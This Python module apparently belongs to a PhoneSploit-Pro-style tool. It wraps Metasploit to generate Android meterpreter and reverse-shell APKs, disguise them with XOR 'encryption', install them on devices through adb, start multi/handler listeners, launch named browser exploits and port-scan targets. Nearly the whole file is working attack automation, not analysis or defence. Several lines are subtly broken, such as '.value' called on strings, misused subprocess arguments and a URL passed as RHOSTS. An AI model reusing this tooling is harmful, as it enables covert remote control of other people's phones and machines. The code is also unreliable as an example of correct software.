"""
Metasploit Integration System
Integrates Metasploit Framework with PhoneSploit-Pro features
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from typing import Dict, List, Optional, Any
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum

class ExploitType(Enum):
    """Exploit type enumeration"""
    ANDROID = "android"
    WEB = "web"
    NETWORK = "network"
    SOCIAL = "social"
    CUSTOM = "custom"

@dataclass
class ExploitSession:
    """Exploit session information"""
    session_id: str
    device_id: str
    exploit_type: ExploitType
    payload: str
    start_time: float
    end_time: Optional[float] = None
    status: str = "active"
    success: bool = False
    result_data: Optional[Dict] = None

class MetasploitIntegration:
    """Advanced Metasploit integration system for PhoneSploit-Pro features"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.msf_path = "msfconsole"
        self.msfvenom_path = "msfvenom"
        self.current_device = None
        self.exploit_history = []
        self.active_sessions: Dict[str, ExploitSession] = {}
        
        # PhoneSploit-Pro specific settings
        self.encryption_enabled = True
        self.secure_payloads = True
        self.auto_cleanup = True
        self.payload_retention_days = 7
        
        # Advanced exploit features
        self.android_exploits_active = False
        self.web_exploits_active = False
        self.network_exploits_active = False
        
        # Common Android exploits
        self.android_exploits = [
            "android/shell/reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "android/shell/reverse_https",
            "android/meterpreter/reverse_https"
        ]
        
        # Common web exploits
        self.web_exploits = [
            "exploit/multi/handler",
            "exploit/windows/browser/ie_cgenericelement_uaf",
            "exploit/windows/browser/ms14_064_ole_code_execution"
        ]
        
    async def start_advanced_exploit_session(self, device_id: str, exploit_type: ExploitType, 
                                           payload: str, lhost: str, lport: int) -> Dict:
        """Start advanced exploit session"""
        try:
            session_id = f"exploit_session_{int(time.time())}_{hash(device_id) % 10000}"
            
            session = ExploitSession(
                session_id=session_id,
                device_id=device_id,
                exploit_type=exploit_type,
                payload=payload,
                start_time=time.time()
            )
            
            self.active_sessions[session_id] = session
            self.current_device = device_id
            
            self.logger.info(f"Advanced exploit session started: {session_id}")
            
            return {
                "success": True,
                "session_id": session_id,
                "device_id": device_id,
                "exploit_type": exploit_type.value,
                "payload": payload,
                "lhost": lhost,
                "lport": lport
            }
            
        except Exception as e:
            self.logger.error(f"Error starting advanced exploit session: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def generate_android_payload(self, payload_type: str, lhost: str, lport: int, 
                                     output_path: str = None) -> Dict:
        """Generate advanced Android payload with PhoneSploit-Pro features"""
        try:
            if payload_type not in [e.value for e in self.android_exploits]:
                return {
                    "success": False,
                    "error": f"Invalid payload type: {payload_type}"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            if not output_path:
                output_path = f"payloads/android_payload_{timestamp}.apk"
            
            # Create payloads directory
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            # Generate payload using msfvenom
            msfvenom_command = [
                self.msfvenom_path,
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "raw",
                "-o", output_path
            ]
            
            result = await asyncio.get_event_loop().run_in_executor(
                None,
                subprocess.run,
                msfvenom_command,
                subprocess.PIPE,
                subprocess.PIPE,
                subprocess.PIPE
            )
            
            if result.returncode == 0 and os.path.exists(output_path):
                # Encrypt payload if enabled
                if self.encryption_enabled:
                    await self._encrypt_payload(output_path)
                
                await self._log_exploit_activity("android_payload_generated", {
                    "payload_type": payload_type,
                    "output_path": output_path,
                    "lhost": lhost,
                    "lport": lport
                })
                
                return {
                    "success": True,
                    "payload_path": output_path,
                    "payload_type": payload_type,
                    "lhost": lhost,
                    "lport": lport,
                    "encrypted": self.encryption_enabled,
                    "message": "Advanced Android payload generated successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to generate payload",
                    "stderr": result.stderr.decode()
                }
                
        except Exception as e:
            self.logger.error(f"Error generating Android payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def install_android_payload(self, payload_path: str, device_id: str = None) -> Dict:
        """Install Android payload on device"""
        try:
            if not device_id:
                device_id = self.current_device
            
            if not device_id:
                return {
                    "success": False,
                    "error": "No device specified"
                }
            
            # Check if payload exists
            if not os.path.exists(payload_path):
                return {
                    "success": False,
                    "error": "Payload file not found"
                }
            
            # Install payload using ADB
            install_command = f"adb -s {device_id} install {payload_path}"
            result = await asyncio.get_event_loop().run_in_executor(
                None,
                subprocess.run,
                install_command.split(),
                subprocess.PIPE,
                subprocess.PIPE,
                subprocess.PIPE
            )
            
            if result.returncode == 0:
                await self._log_exploit_activity("android_payload_installed", {
                    "payload_path": payload_path,
                    "device_id": device_id
                })
                
                return {
                    "success": True,
                    "payload_path": payload_path,
                    "device_id": device_id,
                    "message": "Advanced Android payload installed successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to install payload",
                    "stderr": result.stderr.decode()
                }
                
        except Exception as e:
            self.logger.error(f"Error installing Android payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def start_metasploit_listener(self, payload_type: str, lhost: str, lport: int) -> Dict:
        """Start Metasploit listener for payload"""
        try:
            # Create Metasploit resource file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            resource_file = f"msf_resources/listener_{timestamp}.rc"
            
            os.makedirs("msf_resources", exist_ok=True)
            
            # Generate resource file content
            resource_content = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
            
            with open(resource_file, 'w') as f:
                f.write(resource_content)
            
            # Start Metasploit with resource file
            msf_command = [
                self.msf_path,
                "-r", resource_file,
                "-q"
            ]
            
            # Start in background
            process = await asyncio.create_subprocess_exec(
                *msf_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await self._log_exploit_activity("metasploit_listener_started", {
                "payload_type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "resource_file": resource_file,
                "process_id": process.pid
            })
            
            return {
                "success": True,
                "payload_type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "resource_file": resource_file,
                "process_id": process.pid,
                "message": "Advanced Metasploit listener started successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error starting Metasploit listener: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute_web_exploit(self, target_url: str, exploit_module: str, 
                                 payload: str, lhost: str, lport: int) -> Dict:
        """Execute web exploit using Metasploit"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            resource_file = f"msf_resources/web_exploit_{timestamp}.rc"
            
            os.makedirs("msf_resources", exist_ok=True)
            
            # Generate resource file for web exploit
            resource_content = f"""
use {exploit_module}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set RHOSTS {target_url}
set ExitOnSession false
exploit -j
"""
            
            with open(resource_file, 'w') as f:
                f.write(resource_content)
            
            # Execute exploit
            msf_command = [
                self.msf_path,
                "-r", resource_file,
                "-q"
            ]
            
            result = await asyncio.get_event_loop().run_in_executor(
                None,
                subprocess.run,
                msf_command,
                subprocess.PIPE,
                subprocess.PIPE,
                subprocess.PIPE,
                timeout=60
            )
            
            await self._log_exploit_activity("web_exploit_executed", {
                "target_url": target_url,
                "exploit_module": exploit_module,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "resource_file": resource_file
            })
            
            return {
                "success": True,
                "target_url": target_url,
                "exploit_module": exploit_module,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "resource_file": resource_file,
                "message": "Advanced web exploit executed successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error executing web exploit: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def scan_target_vulnerabilities(self, target_ip: str, scan_type: str = "basic") -> Dict:
        """Scan target for vulnerabilities using Metasploit"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            resource_file = f"msf_resources/vuln_scan_{timestamp}.rc"
            
            os.makedirs("msf_resources", exist_ok=True)
            
            # Generate resource file for vulnerability scan
            if scan_type == "basic":
                resource_content = f"""
use auxiliary/scanner/portscan/tcp
set RHOSTS {target_ip}
set PORTS 1-1000
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS {target_ip}
run
use auxiliary/scanner/http/http_version
set RHOSTS {target_ip}
run
"""
            elif scan_type == "advanced":
                resource_content = f"""
use auxiliary/scanner/portscan/tcp
set RHOSTS {target_ip}
set PORTS 1-65535
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS {target_ip}
run
use auxiliary/scanner/http/http_version
set RHOSTS {target_ip}
run
use auxiliary/scanner/smb/smb_version
set RHOSTS {target_ip}
run
use auxiliary/scanner/ftp/ftp_version
set RHOSTS {target_ip}
run
"""
            else:
                return {
                    "success": False,
                    "error": f"Invalid scan type: {scan_type}"
                }
            
            with open(resource_file, 'w') as f:
                f.write(resource_content)
            
            # Execute scan
            msf_command = [
                self.msf_path,
                "-r", resource_file,
                "-q"
            ]
            
            result = await asyncio.get_event_loop().run_in_executor(
                None,
                subprocess.run,
                msf_command,
                subprocess.PIPE,
                subprocess.PIPE,
                subprocess.PIPE,
                timeout=300
            )
            
            # Parse scan results
            scan_results = {
                "target_ip": target_ip,
                "scan_type": scan_type,
                "open_ports": [],
                "services": [],
                "vulnerabilities": []
            }
            
            # Parse output for open ports and services
            output_lines = result.stdout.decode().split('\n')
            for line in output_lines:
                if "open" in line.lower():
                    scan_results["open_ports"].append(line.strip())
                elif "version" in line.lower():
                    scan_results["services"].append(line.strip())
            
            await self._log_exploit_activity("vulnerability_scan_completed", {
                "target_ip": target_ip,
                "scan_type": scan_type,
                "scan_results": scan_results,
                "resource_file": resource_file
            })
            
            return {
                "success": True,
                "target_ip": target_ip,
                "scan_type": scan_type,
                "scan_results": scan_results,
                "resource_file": resource_file,
                "message": "Advanced vulnerability scan completed successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error scanning target vulnerabilities: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _encrypt_payload(self, payload_path: str):
        """Encrypt payload file"""
        try:
            # Simple XOR encryption for demonstration
            # In production, use proper encryption libraries
            with open(payload_path, 'rb') as f:
                data = f.read()
            
            # XOR with a simple key
            key = b'PhoneSploitPro2024'
            encrypted_data = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
            
            with open(payload_path + '.enc', 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(payload_path)
            
        except Exception as e:
            self.logger.error(f"Error encrypting payload {payload_path}: {str(e)}")
    
    async def _log_exploit_activity(self, activity_type: str, data: Dict):
        """Log exploit activity"""
        try:
            log_entry = {
                "timestamp": time.time(),
                "activity_type": activity_type,
                "device_id": self.current_device,
                "data": data
            }
            
            self.exploit_history.append(log_entry)
            
            # Keep only last 1000 entries
            if len(self.exploit_history) > 1000:
                self.exploit_history = self.exploit_history[-500:]
                
        except Exception as e:
            self.logger.error(f"Error logging exploit activity: {str(e)}")
    
    def get_exploit_statistics(self) -> Dict:
        """Get advanced exploit statistics"""
        try:
            active_sessions = len(self.active_sessions)
            total_exploits = len(self.exploit_history)
            successful_exploits = len([e for e in self.exploit_history if "success" in e.get("data", {})])
            
            return {
                "active_sessions": active_sessions,
                "total_exploits": total_exploits,
                "successful_exploits": successful_exploits,
                "success_rate": (successful_exploits / total_exploits * 100) if total_exploits > 0 else 0,
                "exploit_history_length": len(self.exploit_history),
                "encryption_enabled": self.encryption_enabled,
                "secure_payloads": self.secure_payloads,
                "auto_cleanup": self.auto_cleanup,
                "payload_retention_days": self.payload_retention_days,
                "android_exploits_active": self.android_exploits_active,
                "web_exploits_active": self.web_exploits_active,
                "network_exploits_active": self.network_exploits_active
            }
            
        except Exception as e:
            self.logger.error(f"Error getting exploit statistics: {str(e)}")
            return {}
    
    def get_active_sessions(self) -> List[Dict]:
        """Get active exploit sessions"""
        try:
            return [asdict(session) for session in self.active_sessions.values()]
        except Exception as e:
            self.logger.error(f"Error getting active sessions: {str(e)}")
            return []
    
    def clear_exploit_history(self):
        """Clear exploit history"""
        try:
            self.exploit_history.clear()
            self.logger.info("Exploit history cleared")
        except Exception as e:
            self.logger.error(f"Error clearing exploit history: {str(e)}")